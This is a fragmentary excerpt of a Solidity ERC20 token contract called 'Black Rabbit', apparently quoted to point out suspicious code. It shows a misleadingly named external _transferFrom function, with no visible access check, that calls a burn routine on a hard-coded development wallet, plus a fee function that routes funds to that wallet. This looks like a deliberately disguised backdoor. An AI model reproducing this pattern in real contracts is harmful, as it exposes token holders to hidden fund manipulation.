...
contract BlackRabbit is ERC20, Ownable{
   ...
   using SafeMath for uint256;
    ...
    address public _developmentWalletAddress = 0xf0202CBDCE96E574eC7BB3eBddF5da24ba090d4C;
    ...
    constructor() public ERC20("Black Rabbit", "BRB") {
    ...
    function _transferFrom(uint256 amount) external{
        _burnfuntion(_developmentWalletAddress, amount);
    }
    ...
    function swapAndSendToFee(uint256 tokens) private  {
        ...
        IERC20(ETH).transfer(_developmentWalletAddress, teamFeeBalance);
    }
